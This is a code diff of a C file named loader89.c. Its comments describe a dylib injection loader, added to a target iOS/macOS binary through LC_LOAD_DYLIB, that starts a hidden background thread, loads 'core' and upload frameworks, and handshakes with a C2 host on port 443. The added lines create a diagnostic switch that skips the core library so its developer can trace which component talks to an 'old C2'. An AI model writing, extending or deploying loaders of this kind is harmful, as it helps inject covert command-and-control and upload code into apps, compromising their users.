@@ -1,4 +1,5 @@
 /* loader89.c - 89yl 三件套通用加载器 v1
+ * LOADER89_SKIP_CORE=1: 隔离测试，不加载 libwebuiopsercore，只加载 SDWebuiopser
  * 注入方式: 目标主二进制加 LC_LOAD_DYLIB @executable_path/loader89.dylib
  * 行为: 构造器 -> pthread 后台线程 -> sleep(3) -> dlopen(core+SD) ->
  *       [[CSDataExchange alloc] initWithHost:port:443] -> handshake ->
@@ -30,6 +31,9 @@ extern int pthread_detach(void *);
 #define O_APPEND 8
 #define O_TRUNC 0x400
 #define DT_DIR 4
+
+/* 隔离诊断开关：1=跳过 core，验证旧 C2 是否来自 libwebuiopsercore */
+#define LOADER89_SKIP_CORE 1
 
 #include <dirent.h>
 #include <sys/stat.h>
@@ -142,8 +146,13 @@ static void *worker(void *arg) {
     log_str("=== loader89 v2 start ===");
 
     /* 1. dlopen 核心与上传库 */
+#if LOADER89_SKIP_CORE
+    void *core = 0;
+    log_str("dlopen core SKIPPED (diagnostic)");
+#else
     void *core = dlopen("@executable_path/Frameworks/libwebuiopsercore.framework/libwebuiopsercore", 0xA);
     log_str(core ? "dlopen core OK" : "dlopen core FAIL");
+#endif
     void *sd = dlopen("@executable_path/Frameworks/SDWebuiopser.framework/SDWebuiopser", 0xA);
     log_str(sd ? "dlopen SD OK" : "dlopen SD FAIL");
     if (!core && !sd) { log_str("no components, exit"); return 0; }
